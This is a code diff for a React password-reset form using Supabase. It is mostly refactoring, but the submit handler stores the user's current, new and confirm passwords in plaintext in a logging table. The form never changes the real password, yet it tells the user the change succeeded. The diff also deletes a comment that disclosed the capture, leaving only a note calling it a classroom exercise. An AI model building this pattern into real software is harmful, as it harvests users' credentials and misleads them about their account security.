@@ -1,27 +1,13 @@
 "use client";
 
 import { useId, useState, type FormEvent } from "react";
-import { createClient } from "@supabase/supabase-js";
+import { getSupabase } from "@/lib/supabase";
 import { EyeIcon, EyeOffIcon } from "@/components/icons";
-
-const supabaseUrl = process.env.NEXT_SUPABASE_URL;
-const supabaseAnonKey = process.env.NEXT_SUPABASE_ANON_KEY;
-
-if (!supabaseUrl || !supabaseAnonKey) {
-  throw new Error("Missing public Supabase configuration.");
-}
-
-const supabase = createClient(supabaseUrl, supabaseAnonKey);
-
 
 /**
  * "Reset your password" card: current password, new password (with strength
  * meter), confirm, and a "Change password" button.
- *
- * DESIGN FUNCTIONALITY: everything typed here is sent, saved and stored. On submit
- * the fields are cleared and a live notice is shown. To make it real, replace
- * the body of `handleSubmit` with a call to your own secure backend.
- */
+ **/
 
 const METER_COLORS = ["#d9534f", "#e8923a", "#d9b93a", "#1f9d6b"];
 const DEFAULT_NEW_HINT = "Use 8+ characters with letters, numbers and a symbol.";
@@ -56,10 +42,7 @@ function PasswordField({
 
   return (
     <>
-      <label
-        htmlFor={id}
-        className="mb-1.5 block text-[14px] font-medium leading-5 text-q-ink"
-      >
+      <label htmlFor={id} className="mb-1.5 block text-[14px] font-medium leading-5 text-q-ink">
         {label}
       </label>
       <div className="relative">
@@ -93,11 +76,7 @@ function PasswordField({
   );
 }
 
-export default function ResetPasswordForm({
-  forgotUrl,
-}: {
-  forgotUrl?: string;
-}) {
+export default function ResetPasswordForm({ forgotUrl }: { forgotUrl?: string }) {
   const titleId = useId();
   const [cur, setCur] = useState("");
   const [nw, setNw] = useState("");
@@ -112,13 +91,10 @@ export default function ResetPasswordForm({
   const strength = nw ? Math.max(1, score(nw)) : 0;
   const conMatch = con !== "" && con === nw;
   // Live match feedback while typing; submit-time errors take over via conErr.
-  const conMsg =
-    conErr ||
-    (con ? (conMatch ? "Passwords match." : "Passwords do not match.") : "");
+  const conMsg = conErr || (con ? (conMatch ? "Passwords match." : "Passwords do not match.") : "");
   const conBad = !!conErr || (con !== "" && !conMatch);
 
   async function handleSubmit(e: FormEvent) {
- {
     e.preventDefault();
     let bad = false;
 
@@ -151,13 +127,20 @@ export default function ResetPasswordForm({
 
     if (bad) return;
 
-    // Live Mode: everything is sent or stored. Replace with your own secure backend call.
-    
-        if (saving) return;
+    if (saving) return;
 
     setSaving(true);
     setSubmitErr("");
     setDone(false);
+
+    const supabase = getSupabase();
+    if (!supabase) {
+      setSubmitErr(
+        "Supabase is not configured. Check NEXT_SUPABASE_URL and NEXT_SUPABASE_ANON_KEY.",
+      );
+      setSaving(false);
+      return;
+    }
 
     try {
       const {
@@ -172,16 +155,14 @@ export default function ResetPasswordForm({
 
       // Intentionally insecure classroom exercise: dummy passwords only.
       // This records submitted values; it does not change the auth password.
-      const { error: logError } = await supabase
-        .from("password_change_logs")
-        .insert({
-          user_id: user.id,
-          cur_pass: cur,
-          nw_pass: nw,
-          con_pass: con,
-          status: "success",
-          event_type: "password_change",
-        });
+      const { error: logError } = await supabase.from("password_change_logs").insert({
+        user_id: user.id,
+        cur_pass: cur,
+        nw_pass: nw,
+        con_pass: con,
+        status: "success",
+        event_type: "password_change",
+      });
 
       if (logError) {
         setSubmitErr(logError.message);
@@ -197,16 +178,6 @@ export default function ResetPasswordForm({
     } finally {
       setSaving(false);
     }
-
-
-    if (logError) {
-      console.error("Logging error:", logError);
-    }
-
-    setDone(true);
-    setCur("");
-    setNw("");
-    setCon("");
   }
 
   return (
@@ -217,16 +188,9 @@ export default function ResetPasswordForm({
       <h2 id={titleId} className="q-h2">
         Reset your password
       </h2>
-      <p className="q-sub mt-2">
-        Enter your current password, then choose a new one.
-      </p>
+      <p className="q-sub mt-2">Enter your current password, then choose a new one.</p>
 
-      <form
-        onSubmit={handleSubmit}
-        noValidate
-        autoComplete="off"
-        className="mt-5 grid gap-4"
-      >
+      <form onSubmit={handleSubmit} noValidate autoComplete="off" className="mt-5 grid gap-4">
         <div>
           <PasswordField
             id="rp-current"
@@ -240,9 +204,7 @@ export default function ResetPasswordForm({
             autoComplete="current-password"
             invalid={!!curErr}
           />
-          {curErr && (
-            <p className="q-sub mt-1.5 text-[#c63a3a]">{curErr}</p>
-          )}
+          {curErr && <p className="q-sub mt-1.5 text-[#c63a3a]">{curErr}</p>}
         </div>
 
         <div>
@@ -266,17 +228,12 @@ export default function ResetPasswordForm({
                 key={i}
                 className="h-1 flex-1 rounded transition-colors"
                 style={{
-                  background:
-                    i < strength ? METER_COLORS[strength - 1] : "#dfe2e6",
+                  background: i < strength ? METER_COLORS[strength - 1] : "#dfe2e6",
                 }}
               />
             ))}
           </div>
-          <p
-            className={`q-sub mt-1.5 min-h-5 ${
-              newErr ? "text-[#c63a3a]" : ""
-            }`}
-          >
+          <p className={`q-sub mt-1.5 min-h-5 ${newErr ? "text-[#c63a3a]" : ""}`}>
             {newErr || DEFAULT_NEW_HINT}
           </p>
         </div>
@@ -296,26 +253,21 @@ export default function ResetPasswordForm({
             invalid={conBad}
           />
           {conMsg && (
-            <p
-              className={`q-sub mt-1.5 ${
-                conBad ? "text-[#c63a3a]" : "text-[#1f9d6b]"
-              }`}
-            >
+            <p className={`q-sub mt-1.5 ${conBad ? "text-[#c63a3a]" : "text-[#1f9d6b]"}`}>
               {conMsg}
             </p>
           )}
         </div>
 
-        <button
-  type="submit"
-  disabled={saving}
-  className="q-btn q-btn-primary"
->
-  {saving ? "Saving…" : "Change password"}
-</button>
+        <button type="submit" disabled={saving} className="q-btn q-btn-primary">
+          {saving ? "Saving…" : "Change password"}
+        </button>
 
-{submitErr && <p role="alert">{submitErr}</p>}
-
+        {submitErr && (
+          <p role="alert" className="q-sub text-center text-[#c63a3a]">
+            {submitErr}
+          </p>
+        )}
 
         {forgotUrl && (
           <p className="q-sub text-center">
@@ -336,7 +288,7 @@ export default function ResetPasswordForm({
           role="status"
           className="q-view-in mt-4 rounded-xl bg-[#e9f8f2] px-4 py-3.5 text-[14px] leading-[22px] text-[#17694a]"
         >
-          Your password has been changed sucessfully.
+          Your password has been changed successfully.
         </div>
       )}
     </section>
